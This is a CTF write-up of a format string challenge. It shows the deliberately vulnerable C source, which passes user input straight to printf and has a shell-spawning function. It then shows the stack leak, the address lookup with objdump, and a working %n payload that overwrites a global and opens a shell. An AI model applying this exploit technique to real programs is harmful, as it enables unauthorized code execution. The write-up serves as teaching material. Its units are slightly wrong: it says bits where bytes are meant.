# format-1

Disclaimer : Writup by z0rex, https://github.com/VulnHub/ctf-writeups/blob/master/2016/angstrom-ctf/format-1.md
Description: ```This program is vulnerable to a format string attack! Try supplying a format string to overwrite a global variable and get a shell! You can exploit the binary on our shell server at /problems/format1/. Download the binary here, and source code is available here```

Ok, the challenge gave us a source code :
```
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

int secret = 0;

void give_shell()
{
    gid_t gid = getegid();
    setresgid(gid, gid, gid);
    system("/bin/sh -i");
}

int main(int argc, char **argv)
{
    char buf[128];
    memset(buf, 0, sizeof(buf));
    fgets(buf, 128, stdin);
    printf(buf);

    if (secret == 192)
    {
        give_shell();
    }
    else
    {
        printf("Sorry, secret = %d\n", secret);
    }

    return 0;
}
```

As we can see, there is a function called ```give_shell()``` to give us what we want.
Next, i try to analize the source code.
```
int secret = 0;
.
.
.
if (secret == 192)
    {
        give_shell();
    }
    else
    {
        printf("Sorry, secret = %d\n", secret);
    }
 ...
```
In order to call the ```give_shell()``` function, one must set ```int secret``` value to 192, but the source code doesn't seem have an intstruction to do that. Again, i analize the program.
```
    char buf[128];
    memset(buf, 0, sizeof(buf));
    fgets(buf, 128, stdin);
    printf(buf); <----------------- Vulnerable
```
It seems that someone forgot to specify the output type, a ```printf``` like this is vulnerable to ```Format String Exploitation```.

First lets try to run it :
```
blaccmail@localhost:~$ ./format.exe
ayy 
ayy
Sorry, secret = 0
blaccmail@localhost:~$ 
```
To Exploit the program we need :
```
-> Trigger give_shell()
-> Know the buf index
-> Know the address to write ('secret' address)
-> Know what to write a.k.a the exploit
```
To find the buf index, we need to leak the program memory by using ```%x``` printf argument :
```
blaccmail@localhost:~$ python -c "print 'A'*4 + '-%x-%x-%x-%x-%x-%x-%x-%x'" | ./format.exe
AAAA-80-f7785580-ffb064f4-ffb063fe-1-c2-41414141
Sorry, secret = 0
blaccmail@localhost:~$
```
Looks like the string placed in index 7.

Then we need to find 'secret' address to change its value. We can use ```objdump``` command :
```
blaccmail@localhost:~$ objdump -t format.exe | grep secret
0804a040 g     O .bss   00000004              secret
blaccmail@localhost:~$ 
```

Great! we have found all the things we need, now we can craft our exploit :
```
-------------------------------------------------------------
python -c "print '\x40\xa0\x04\x08%188x%7$n'" | ./format.exe
-------------------------------------------------------------
-> \x40\xa0\x04\x08 : 4bit 'secret' address
-> %188x            : 188bit junk value (4+188 = 192 wich is exact value to trigger give_shell())
-> %7$n             : index & shell
```

Now, lets try that :
```
blaccmail@localhost:~$ python -c "print '\x40\xa0\x04\x08%188x%7$n'" | ./format.exe
@�                                                                                                                                                                                          80
sh-4.3# exit
blaccmail@localhost:~$ 
```

Yes! we got it, then move on to the real thing and then cat the flag :
```
cat flag.txt
[2]+  Stopped                 ( python2 -c 'print "\x40\xa0\x04\x08%188x%7$n"'; cat ) | ./format1
team24254@shell:/problems/format1$ is_%n_used_for_anything_besides_this
```
# Flag : {is_%n_used_for_anything_besides_this}
